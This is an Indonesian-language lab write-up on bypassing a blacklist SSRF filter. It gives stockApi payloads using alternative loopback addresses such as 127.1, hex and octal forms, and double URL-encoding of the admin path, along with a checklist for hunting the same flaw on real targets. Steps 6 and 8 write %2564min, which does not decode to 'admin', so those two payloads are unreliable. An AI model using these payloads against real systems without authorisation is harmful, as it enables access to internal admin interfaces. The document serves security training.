# SSRF with Blacklist-Based Input Filter

## 1. Ringkasan Lab

**Nama Lab:** SSRF with blacklist-based input filter
**Kategori:** Server-Side Request Forgery (SSRF)
**Tingkat:** Practitioner
**Tujuan:**
- Akses admin interface di `http://localhost/admin`
- Menghapus user carlos

**Konsep utama:**
Aplikasi memiliki fitur stock check yang melakukan request ke URL internal. Developer memasang dua lapisan blacklist filter yang lemah untuk mencegah SSRF, namun keduanya dapat di-bypass dengan teknik obfuskasi.

---

## 2. Langkah Eksploitasi (Lab)

1. Buka salah satu produk, klik **Check stock**, lalu intercept request di Burp Suite dan kirim ke Repeater.
2. Ubah nilai parameter `stockApi` menjadi `http://127.0.0.1/` → request **diblokir** (filter mendeteksi `127.0.0.1`).
3. Bypass filter pertama dengan menggunakan representasi alternatif loopback:

```
stockApi=http://127.1/
```

4. Request berhasil — filter tidak mengenal `127.1` sebagai loopback.
5. Coba akses `http://127.1/admin` → request **diblokir** lagi (filter mendeteksi kata `admin`).
6. Bypass filter kedua dengan double URL-encode huruf `a` pada kata `admin`:

```
a → %61 → %2561
```

Sehingga URL menjadi:

```
stockApi=http://127.1/%2564min
```

7. Admin interface berhasil diakses.
8. Temukan endpoint delete user, lalu kirim request:

```
stockApi=http://127.1/%2564min/delete?username=carlos
```

9. Lab solved.

---

## 3. Kenapa Bypass Ini Bisa Berhasil?

### Bypass Pertama — Representasi Loopback Alternatif

Filter memblokir string `127.0.0.1` dan `localhost` secara literal.

Namun browser dan sistem operasi mengenali banyak representasi loopback lain:

```
127.0.0.1   ← diblokir
127.1       ← tidak diblokir, tapi tetap resolve ke loopback
localhost   ← diblokir
```

Filter yang hanya memblokir string tertentu tanpa memvalidasi semua representasi IP akan gagal.

### Bypass Kedua — Double URL Encoding

Filter memblokir kata `admin` pada path.

Namun filter hanya melakukan decode satu kali sebelum memeriksa:

```
/admin        ← diblokir
/%61dmin      ← mungkin diblokir (single encode, a = %61)
/%2561dmin    ← lolos (double encode, %25 = %, sehingga %2561 dibaca sebagai %61 = a)
```

Server backend melakukan decode dua kali sehingga akhirnya membaca `/admin`.

Alurnya:

```
Request dikirim dengan /%2561dmin
        │
        ▼
Filter membaca /%2561dmin → tidak cocok dengan "admin" → lolos
        │
        ▼
Backend melakukan URL decode pertama → /%61dmin
        │
        ▼
Backend melakukan URL decode kedua → /admin
        │
        ▼
Admin interface diakses
```

---

## 4. Dua Defense yang Dipasang Developer

| Defense | Yang Diblokir | Cara Bypass |
|---|---|---|
| Filter 1 | `127.0.0.1`, `localhost` | Gunakan `127.1` atau representasi loopback lain |
| Filter 2 | Kata `admin` pada path | Double URL-encode karakter dalam kata tersebut |

Kedua defense ini tergolong **weak** karena hanya mengandalkan string matching tanpa normalisasi input.

---

## 5. Lab vs Real Case

### Lab

- URL target sudah diketahui (`http://localhost/admin`)
- Defense sengaja dibuat lemah agar bisa dipelajari
- Bypass cukup dua langkah

### Real Case

Di dunia nyata kemungkinan yang ditemukan:

- Blacklist yang lebih panjang tapi tetap tidak lengkap
- Filter yang hanya decode satu kali sebelum validasi
- Kombinasi bypass IP dan bypass path sekaligus
- Filter berbasis regex yang salah ditulis
- WAF yang bisa di-bypass dengan encoding tidak umum

Representasi IP yang sering lolos dari filter:

```
http://127.1/
http://127.0.1/
http://0x7f000001/       ← hex
http://2130706433/       ← desimal
http://0177.0.0.1/       ← oktal
http://[::1]/            ← IPv6 loopback
http://[::]@127.0.0.1/
```

---

## 6. Kenapa Double Encode Bekerja?

Karena ada perbedaan jumlah decode antara filter dan backend.

```
Filter    → decode 1x → masih /%61dmin → tidak cocok "admin" → lolos
Backend   → decode 2x → /admin         → akses berhasil
```

Ini adalah klasik dari **parser differential** — dua komponen memproses input yang sama dengan cara berbeda.

---

## 7. Cara Hunting SSRF dengan Blacklist Filter

### Langkah 1 — Konfirmasi SSRF Ada

Coba URL external seperti Burp Collaborator untuk memastikan server benar-benar melakukan request:

```
stockApi=http://xxxx.oastify.com/
```

Jika Collaborator menerima hit, SSRF terkonfirmasi.

### Langkah 2 — Uji Blacklist

Coba secara berurutan:

```
http://127.0.0.1/
http://localhost/
http://127.1/
http://0x7f000001/
http://2130706433/
http://0177.0.0.1/
http://[::1]/
```

Perhatikan mana yang diblokir dan mana yang lolos.

### Langkah 3 — Uji Path Filter

Jika path tertentu diblokir coba encode:

```
/admin          ← diblokir
/%61dmin        ← coba single encode
/%2561dmin      ← coba double encode
/adm%69n        ← encode karakter tengah
/ADMIN          ← coba uppercase
```

### Langkah 4 — Kombinasikan

Gabungkan bypass IP dan bypass path yang berhasil:

```
stockApi=http://127.1/%2561dmin
```

---

## 8. Checklist Hunting

✅ Coba semua representasi loopback

✅ Coba single URL encode pada path

✅ Coba double URL encode pada path

✅ Coba uppercase / mixed case

✅ Konfirmasi dengan Burp Collaborator

✅ Bandingkan response saat diblokir vs lolos

✅ Cari endpoint admin atau sensitif lainnya

---

## 9. Pelajaran Lab

- Blacklist berbasis string matching tidak cukup untuk mencegah SSRF.
- Selalu ada representasi alternatif dari IP loopback yang mungkin tidak ada dalam blacklist.
- Double URL encoding mengeksploitasi perbedaan decode antara filter dan backend.
- Defense yang benar adalah **whitelist** bukan blacklist — hanya izinkan URL yang memang dibutuhkan.
- Normalisasi input sebelum validasi adalah kunci untuk mencegah encoding bypass.

---

## 10. Inti Lab

### Bug Class

```
Server-Side Request Forgery (SSRF)
```

### Root Cause

```
Blacklist filter hanya memblokir string literal tertentu tanpa normalisasi input,
sehingga representasi alternatif dan encoding bypass dapat melewati filter.
```

### Teknik Bypass

```
1. Representasi loopback alternatif → 127.1
2. Double URL encoding              → %2561 dibaca sebagai a oleh backend
```

### Alur Serangan

```
stockApi parameter
        │
        ▼
Bypass Filter IP dengan 127.1
        │
        ▼
Bypass Filter Path dengan double encode
        │
        ▼
Akses http://127.1/%2561dmin
        │
        ▼
Backend decode → http://127.1/admin
        │
        ▼
Admin interface diakses
        │
        ▼
Delete user carlos
```
